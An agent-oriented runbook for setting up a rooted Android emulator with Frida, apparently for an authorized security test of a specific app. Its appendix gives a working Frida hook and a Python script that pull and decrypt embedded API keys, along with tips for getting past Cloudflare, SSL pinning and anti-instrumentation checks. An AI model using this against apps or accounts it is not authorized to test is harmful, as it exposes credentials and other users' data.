# Skill: Cold-start an Android arm64 emulator + Frida for mobile app instrumentation (macOS Apple Silicon)

**Purpose.** Take a fresh macOS (Apple Silicon) machine from nothing to a rooted arm64 Android
emulator running `frida-server`, ready to instrument an APK (hook native code, dump values,
inspect traffic). Written as an ordered runbook an agent can execute step by step, with a
verification check and a failure remedy after each step.

**Authorization note (read first).** This procedure is for instrumenting apps you are authorized
to test, on emulators/accounts you control. Do not use it to access other people's data or live
production accounts that are not yours or a sanctioned test account.

**Assumptions**
- macOS on Apple Silicon (arm64). Homebrew installed (`brew --version` works).
- Target app ships `arm64-v8a` native libraries, so the emulator MUST be arm64 (an x86_64 image
  will silently fail to load arm64 `.so` files).
- Root is required for `frida-server`, so use a **Google APIs** (or AOSP) system image, NOT a
  **Google Play** image (Play images refuse `adb root`).

---

## Step 0 — Homebrew sanity
```bash
brew --version   # expect: Homebrew 4.x
```
Fail → install Homebrew from https://brew.sh, then re-open the shell.

## Step 1 — Install a JDK (fixes "Unable to locate a Java Runtime")
`sdkmanager`/`avdmanager` are Java tools and need a JDK 17+.
```bash
brew install --cask temurin@17
# make this shell (and future ones) see it:
export JAVA_HOME="$(/usr/libexec/java_home -v 17)"
java -version   # expect: openjdk version "17.x"
```
Verify → `java -version` prints 17. Fail → `/usr/libexec/java_home -V` to list installed JDKs;
if none, the cask install failed (check `brew install --cask temurin@17` output).

## Step 2 — Android command-line tools + environment
```bash
brew install --cask android-commandlinetools

export ANDROID_HOME="$(brew --prefix)/share/android-commandlinetools"
export PATH="$ANDROID_HOME/platform-tools:$ANDROID_HOME/emulator:$ANDROID_HOME/cmdline-tools/latest/bin:$PATH"

sdkmanager --version   # expect a version number, no Java error
```
Verify → `sdkmanager --version` prints a number. Fail with "Unable to locate a Java Runtime" →
Step 1 not applied in THIS shell; re-run the `JAVA_HOME` export.

> Persist these across shells: append the `JAVA_HOME`, `ANDROID_HOME`, and `PATH` exports to
> `~/.zshrc`, then `source ~/.zshrc`. Without this, a new terminal re-hits the Java error.

## Step 3 — Accept licenses and install SDK packages
```bash
yes | sdkmanager --licenses

sdkmanager \
  "platform-tools" \
  "emulator" \
  "platforms;android-34" \
  "build-tools;34.0.0" \
  "system-images;android-34;google_apis;arm64-v8a"
```
Verify → `sdkmanager --list_installed` shows `emulator`, `platform-tools`, and the
`...google_apis;arm64-v8a` image. Note: the `sdkmanager: line 173: test:` warning is benign once
Java is present.

## Step 4 — Create an arm64 AVD
Do NOT pass `-d <device>` with the Homebrew cmdline-tools: the device lookup mis-resolves
`devices.xml` and fails ("Could not load devices from …/system-images/…/arm64-v8a/devices.xml").
Omit `-d` — a default device profile boots fine for instrumentation.
```bash
echo "no" | avdmanager create avd \
  -n dcs_arm64 \
  -k "system-images;android-34;google_apis;arm64-v8a"

avdmanager list avd   # expect: Name: dcs_arm64
```
Fail "package path is not valid" → the system image in Step 3 didn't install; re-run it.
Want a specific device profile → `avdmanager list device` for valid ids, then add `-d <id>`; if it
throws the `devices.xml` error, drop `-d` (this is a cmdline-tools packaging bug, not your mistake).

## Step 5 — Launch the emulator and wait for full boot
```bash
# Run in the background; keep the window so you can drive the app UI.
emulator -avd dcs_arm64 -no-snapshot -no-boot-anim -gpu swiftshader_indirect &

adb wait-for-device
# block until Android finishes booting:
adb shell 'while [[ "$(getprop sys.boot_completed)" != "1" ]]; do sleep 1; done' && echo "BOOTED"
adb devices   # expect: emulator-5554   device
```
Fail "no devices/emulators found" → the emulator process died; re-run `emulator …` in the
foreground to read the error (common: wrong arch image, or GPU flag — try
`-gpu host` or `-gpu swiftshader_indirect`). First boot can take several minutes.

## Step 6 — Root the emulator and install frida-server (arm64)
```bash
adb root          # expect: "restarting adbd as root" (works on google_apis image)
adb shell whoami  # expect: root

# Install frida-tools in a venv (avoids broken pip shebangs pointing at a removed Python):
python3 -m venv ~/.frida-venv
source ~/.frida-venv/bin/activate    # do this in EVERY shell that runs frida (or call ~/.frida-venv/bin/frida)
pip install -U frida-tools
frida --version   # must print a version (e.g. 16.5.9); if EMPTY, stop — the download below will be junk

# download the matching arm64 server (client and server versions MUST match):
FRIDA_VER="$(frida --version)"
[ -n "$FRIDA_VER" ] || { echo "frida --version empty; fix the venv before continuing"; }
curl -L -o /tmp/frida-server.xz \
  "https://github.com/frida/frida/releases/download/${FRIDA_VER}/frida-server-${FRIDA_VER}-android-arm64.xz"
ls -lh /tmp/frida-server.xz   # a few MB = ok; ~9 bytes = empty FRIDA_VER produced a 404 page
unxz -f /tmp/frida-server.xz

adb push /tmp/frida-server /data/local/tmp/frida-server
adb shell chmod 755 /data/local/tmp/frida-server
adb shell "/data/local/tmp/frida-server &"   # runs as root because of `adb root`

frida-ps -U | head   # expect: a process list = frida is talking to the device
```
Fail `frida-ps` "unable to connect" / "version mismatch" → server and client versions differ:
re-download the server for the exact `frida --version`. Fail `adb root` "cannot run as root in
production build" → you used a Play image; recreate the AVD with a `google_apis` image (Step 4).

## Step 7 — Install the target app and instrument it
```bash
adb install "example.apk"

# spawn the app under Frida with the hook script (see Appendix for dump-keys.js):
frida -U -f co.dangerclose.app -l dump-keys.js
```
frida 17.x auto-resumes on spawn (the old `--no-pause` is the default and the flag was REMOVED —
passing it errors "unrecognized arguments: --no-pause"). If the app looks paused at the REPL, type
`%resume`. Then drive the app UI (open the AI chat) to trigger the code path you hooked.

Fail "Failed to spawn: unable to find application" → confirm the package name with
`frida-ps -Uai` (lists installed apps + identifiers) and use the exact identifier.

---

## Verification matrix (assert these in order)
| # | Command | Pass condition |
|---|---------|----------------|
| 1 | `java -version` | openjdk 17.x |
| 2 | `sdkmanager --version` | a version, no Java error |
| 3 | `sdkmanager --list_installed` | `...google_apis;arm64-v8a` present |
| 4 | `avdmanager list avd` | `dcs_arm64` present |
| 5 | `adb shell getprop sys.boot_completed` | `1` |
| 6 | `adb shell whoami` | `root` |
| 7 | `frida-ps -U` | process list prints |
| 8 | `frida-ps -Uai` | target app identifier listed |

## Troubleshooting quick table
| Symptom | Cause | Fix |
|---------|-------|-----|
| "Unable to locate a Java Runtime" | No JDK, or JAVA_HOME not set in this shell | Step 1 + `export JAVA_HOME=...` |
| `no devices/emulators found` | Emulator not started/booted | Step 5; wait for `sys.boot_completed=1` |
| arm64 `.so` won't load / app crashes on start | x86_64 image used | Recreate AVD with `arm64-v8a` image |
| `adb root` refused | Google **Play** image | Use `google_apis` (or AOSP) image |
| `avdmanager` "Could not load devices from …/devices.xml" | `-d <device>` bug in Homebrew cmdline-tools | Create the AVD without `-d` (Step 4) |
| `frida-ps` version mismatch | server != client version | Re-download server for exact `frida --version` |
| `frida: bad interpreter: …/python3.x: no such file` | frida installed under a since-removed Python | Reinstall in a venv (Step 6); run frida from `~/.frida-venv/bin` |
| `unxz: File format not recognized` on frida-server | `FRIDA_VER` was empty → curl saved a ~9-byte 404 page | Fix `frida --version` first; re-check `ls -lh /tmp/frida-server.xz` |
| `frida: error: unrecognized arguments: --no-pause` | frida 17.x removed the flag (now default) | Drop `--no-pause`; use `%resume` in the REPL if paused |
| venv `bin/python3` dangling / `pip: bad interpreter` | venv built from a since-removed base Python | Build venv from an explicit Homebrew python: `/opt/homebrew/bin/python3.12 -m venv …`, verify the symlink resolves |
| App detects Frida / won't start | anti-instrumentation | `frida -U -f <pkg> --runtime=v8`, or use `objection`/gadget; add a detection-bypass script |
| SSL pinning blocks traffic capture | cert pinning | Add a Frida pinning-bypass script; or use mitmproxy + user CA on a `-writable-system` boot |

## Teardown / reset (run this when done — includes scrubbing recovered secrets)

**1. Stop everything that's running:**
```bash
adb emu kill 2>/dev/null                        # stop the emulator
adb shell "pkill frida-server" 2>/dev/null      # kill the on-device agent (harmless if emulator gone)
pkill -f mitmweb 2>/dev/null; pkill -f mitmproxy 2>/dev/null   # stop the proxy
deactivate 2>/dev/null                          # leave the frida venv
```

**2. Clear the emulator proxy** (so a later launch isn't silently intercepted / cert-broken):
```bash
adb shell settings put global http_proxy :0 2>/dev/null
adb shell settings delete global http_proxy 2>/dev/null
adb shell settings delete global global_http_proxy_host 2>/dev/null
adb shell settings delete global global_http_proxy_port 2>/dev/null
```

**3. Scrub recovered secret material (do NOT leave this on disk).** Instrumentation produces files
that hold plaintext secrets, the AES passphrase, and ciphertext. Look for and remove:
```bash
# known artifacts from the react-native-keys recipe:
rm -f ~/Desktop/dcs-apk/keys.json \        # decrypted plaintext keys (REAL secrets)
      ~/Desktop/dcs-apk/keys-dump.log \     # frida capture: passphrase + ciphertext
      ~/Desktop/dcs-apk/ct.b64 ~/Desktop/dcs-apk/ct.bin \
      /tmp/frida-server* /tmp/ct.* 2>/dev/null

# sweep for anything else that may contain recovered material before you finish:
grep -rilE '_(AGENTIC_API_KEY|USER_ID_SECRET)|Salted__|\[secret\]' \
      ~/Desktop ~/Downloads /tmp 2>/dev/null     # review hits, then delete/redact
```
Also treat the source APK in `~/Downloads` and any Hopper/Frida scratch files as sensitive.

**4. Optional full lab removal:**
```bash
adb uninstall <app.package.id> 2>/dev/null       # e.g. co.dangerclose.app
avdmanager delete avd -n dcs_arm64 2>/dev/null     # remove the AVD
```
Cold-boot a kept AVD fresh (discard saved state): add `-no-snapshot-load -wipe-data` to `emulator`.

**5. Remediation reminder:** any secret recovered from a shipped binary during validation must be
treated as disclosed. The fix is not just better storage — it's **rotating every exposed key** and
moving server-privileged ones off the client. Keep only the report and this runbook; delete the
extracted values.

---

## Appendix — `dump-keys.js` (react-native-keys secret dumper)
Hooks the native `decryptor::dec(...)` in `libreact-native-keys.so` and prints the AES passphrase,
per-key ciphertext, and decrypted plaintext as each secret is resolved. Save next to where you run
Frida.
```js
function readStdStr(p){
  try{
    const f = p.readU8();
    if ((f & 1) === 0) return p.add(1).readUtf8String(f >> 1);   // libc++ short-string (SSO)
    const len = p.add(8).readU64().toNumber();
    return p.add(16).readPointer().readUtf8String(len);          // heap string
  }catch(e){ return '<unreadable>'; }
}
function findModule(name){
  // Frida 17 removed the static Module.* helpers; get a Module INSTANCE instead.
  try{ const m = Process.findModuleByName(name); if(m) return m; }catch(e){}
  return Process.enumerateModules().find(m => m.name === name) || null;
}
function hook(){
  const mod = findModule('libreact-native-keys.so');
  if(!mod) return false;
  const MANGLED='_ZN9decryptor3decERKNSt6__ndk112basic_stringIcNS0_11char_traitsIcEENS0_9allocatorIcEEEES8_b';
  let addr = null;
  try{ addr = mod.findExportByName(MANGLED); }catch(e){}                       // instance method (F17)
  if(!addr){
    try{ const s = mod.enumerateSymbols().find(x=>x.name.indexOf('decryptor3dec')>=0); if(s) addr=s.address; }
    catch(e){ console.log('enumerateSymbols err '+e); }
  }
  if(!addr){ console.log('[!] decryptor::dec not found'); return true; }
  Interceptor.attach(addr,{
    onEnter(a){ this.cipher=readStdStr(a[0]); this.pass=readStdStr(a[1]); },
    onLeave(r){ console.log('\n[secret] plaintext  = '+readStdStr(r));
                console.log('         passphrase = '+this.pass);
                console.log('         ciphertext = '+this.cipher); }
  });
  console.log('[+] hooked decryptor::dec @ '+addr);
  return true;
}
let ok=false; try{ ok=hook(); }catch(e){ console.log('hook err '+e); }
if(!ok){ const id=setInterval(()=>{ try{ if(hook()) clearInterval(id); }catch(e){ console.log('hook err '+e); clearInterval(id); } }, 200); }
```

> **Frida 17 API note.** The static `Module.findExportByName(name, export)` and
> `Module.enumerateSymbols(name)` were removed. Use a Module **instance**
> (`Process.findModuleByName(name)` / `Process.enumerateModules()`), then its methods
> `mod.findExportByName(export)` and `mod.enumerateSymbols()`. Using the old static forms throws
> `TypeError: not a function`.

## Recipe: validate react-native-keys secret extraction (AES/CryptoJS builds)
Newer react-native-keys builds AES-encrypt the values (OpenSSL/CryptoJS `Salted__` format) and decrypt
them at runtime via a native `decryptor::dec(...)`. The decryption passphrase ships in the same `.so`,
so the values are fully recoverable:
1. Hook `decryptor::dec` (Appendix script) and trigger the feature that resolves the secret. The
   `onEnter` args give the **passphrase** and the **base64 ciphertext**; capture the console to a file
   with `frida … -o dump.log`.
2. Decrypt offline (use REAL OpenSSL, not macOS LibreSSL, or do it in Python to avoid CLI quirks). The
   KDF is EVP_BytesToKey/MD5 by default:
   ```bash
   grep 'ciphertext =' dump.log | sed 's/.*ciphertext = //' | head -1 | tr -d ' \r\n' > ct.b64
   ~/.frida-venv/bin/pip install pycryptodome
   ~/.frida-venv/bin/python - <<'PY'
   import base64,hashlib,json
   from Crypto.Cipher import AES
   ct=base64.b64decode(open('ct.b64').read()); salt,data=ct[8:16],ct[16:]
   pw=b'<PASSPHRASE_FROM_HOOK>'
   d=prev=b''
   while len(d)<48: prev=hashlib.md5(prev+pw+salt).digest(); d+=prev
   pt=AES.new(d[:32],AES.MODE_CBC,d[32:48]).decrypt(data); pt=pt[:-pt[-1]]
   json.dump(json.loads(pt), open('keys.json','w'), indent=2)
   print('recovered', len(json.load(open('keys.json'))), 'keys')
   PY
   ```
   (If MD5 yields garbage, try SHA-256. `magic` bytes must be `Salted__`.)
3. Recovering the plaintext keys proves the "encrypt with a key you also ship" anti-pattern: the AES
   layer adds nothing. **Treat all recovered keys as compromised and rotate them.**

### Ground rules for the live-auth check
- Test only against your own / a sanctioned test account. Never enumerate identifiers or read other
  users' data.
- A single authorized request is enough to demonstrate a broken-object-level-authorization model
  (e.g. server returns HTTP 200 for a client-derived id authenticated only by a shared key).
- Many endpoints sit behind Cloudflare: a non-browser client gets `403 error code: 1010`; sending the
  app's HTTP-client `User-Agent` (RN Android = `okhttp/4.x`) passes the edge. Getting past Cloudflare
  is not the vulnerability — the app's own authorization decision is.
- Tear down interception before testing login flows: cert-pinned auth endpoints (Shopify / account
  hosts) break through mitmproxy. Clear the proxy (`adb shell settings delete global http_proxy`, kill
  `mitmproxy`) and log in directly.

## Notes for the specific engagement (DangerCloseApp)
- Package: `co.dangerclose.app.xxxx`. Trigger the **AI chat** to force `EXAMPLE_AGENTIC_API_KEY`
  and `EXAMPLE_USER_ID_SECRET` to resolve through `decryptor::dec`.
- After dumping the values, the derived user id is
  `HMAC-SHA256(customerId, EXAMPLE_USER_ID_SECRET)` (hex). Validate reads only against your own /
  test customer id; do not enumerate customer ids or read other people's data.
